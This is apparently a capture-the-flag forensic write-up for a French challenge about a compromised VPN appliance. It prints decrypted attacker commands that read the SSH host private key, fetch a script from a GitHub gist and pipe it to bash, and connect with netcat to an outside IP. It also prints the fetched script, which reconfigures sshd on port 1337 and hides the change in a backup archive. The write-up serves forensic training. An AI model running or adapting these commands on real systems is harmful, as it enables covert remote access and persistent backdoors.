# Horreur, malheur 4/5 - Pas si simple persistance

## Challenge
Introduction commune à la série Horreur, malheur

Vous venez d'être embauché en tant que Responsable de la Sécurité des Systèmes d'Information (RSSI) d'une entreprise stratégique.

En arrivant à votre bureau le premier jour, vous vous rendez compte que votre prédécesseur vous a laissé une clé USB avec une note dessus : VPN compromis (intégrité). Version 22.3R1 b1647.

Note : La première partie (Archive chiffrée) débloque les autres parties, à l'exception de la seconde partie (Accès initial) qui peut être traitée indépendamment. Nous vous recommandons de traiter les parties dans l'ordre.

Vous remarquez qu'une fonctionnalité built-in de votre équipement ne fonctionne plus et vous vous demandez si l'attaquant n'a pas utilisé la première persistance pour en installer une seconde, moins "visible"...

Vous cherchez les caractéristiques de cette seconde persistance : protocole utilisé, port utilisé, chemin vers le fichier de configuration qui a été modifié, chemin vers le fichier qui a été modifié afin d'établir la persistance.

> Le flag est au format : FCSC{<protocole>:<port>:<chemin_absolu>:<chemin_absolu>}.

## Decrypted traffic from part3
```console
$ python3 sol.py
cat /data/runtime/etc/ssh/ssh_host_rsa_key
/home/bin/curl -k -s https://api.github.com/repos/joke-finished/2e18773e7735910db0e1ad9fc2a100a4/commits?per_page=50 -o /tmp/a
cat /tmp/a | grep "name" | /pkg/uniq | cut -d ":" -f 2 | cut -d '"' -f 2 | tr -d '' | grep -o . | tac | tr -d ''  > /tmp/b
a=`cat /tmp/b`;b=${a:4:32};c="https://api.github.com/gists/${b}";/home/bin/curl -k -s ${c} | grep 'raw_url' | cut -d '"' -f 4 > /tmp/c
c=`cat /tmp/c`;/home/bin/curl -k ${c} -s | bash
rm /tmp/a /tmp/b /tmp/c
nc 146.0.228.66:1337
```

Let's see what this is doing one step at a time:
```console
$ cat /tmp/b
degbf1b75ea202a92df5b9f151535b7f19fez4x

$ cat /tmp/c
https://gist.githubusercontent.com/joke-finished/f1b75ea202a92df5b9f151535b7f19fe/raw/ae0bca6e36064e1c810aa55960a6e30b94f64fca/gistfile1.txt

$ c=`cat /tmp/c`;curl -k ${c} -s
sed -i 's/port 830/port 1337/' /data/runtime/etc/ssh/sshd_server_config > /dev/null 2>&1
sed -i 's/ForceCommand/#ForceCommand/' /data/runtime/etc/ssh/sshd_server_config > /dev/null 2>&1
echo "PubkeyAuthentication yes" >> /data/runtime/etc/ssh/sshd_server_config
echo "AuthorizedKeysFile /data/runtime/etc/ssh/ssh_host_rsa_key.pub" >> /data/runtime/etc/ssh/sshd_server_config
pkill sshd-ive > /dev/null 2>&1
gzip -d /data/pkg/data-backup.tgz > /dev/null 2>&1
tar -rf /data/pkg/data-backup.tar /data/runtime/etc/ssh/sshd_server_config > /dev/null 2>&1
gzip /data/pkg/data-backup.tar > /dev/null 2>&1
mv /data/pkg/data-backup.tar.gz /data/pkg/data-backup.tgz > /dev/null 2>&1
```

To establish this persistence, the attacker modifies the `ssh` config in `/data/runtime/etc/ssh/sshd_server_config` to use `port 1337` by allowing the use of Public key Authentication. The attacker also stores the updated `ssh config` in file `/data/pkg/data-backup.tgz` by unzipping the `tar archive`, adding the `ssh config` file to it and rezipping it:
- used protocol: ssh
- used port: 1337
- modified config: /data/runtime/etc/ssh/sshd_server_config
- modified file to establish the persistence: /data/pkg/data-backup.tgz

## Flag
> FCSC{ssh:1337:/data/runtime/etc/ssh/sshd_server_config:/data/pkg/data-backup.tgz}
